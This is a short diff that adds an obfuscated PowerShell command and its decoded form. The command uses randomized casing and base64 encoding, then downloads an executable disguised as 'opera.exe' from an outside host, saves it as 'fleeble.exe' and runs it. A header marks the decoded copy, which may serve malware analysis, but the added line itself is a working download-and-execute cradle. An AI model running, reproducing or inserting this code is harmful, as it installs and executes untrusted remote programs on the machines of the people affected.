@@ -1,0 +1,7 @@
+iex([sYSteM.TEXt.eNcoDINg]::utf8.GeTsTring([SyStEm.cOnVerT]::fromBAse64strinG('CihOZXctT2JqZWN0IFN5U1RFbS5uRXQuV0VCQ0xpZU50KS5ET1dubE9hZEZpTEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vb3BlcmEuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SySTEm.nEt.WEBCLieNt).DOWnlOadFiLE('http://worldnit.com/opera.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
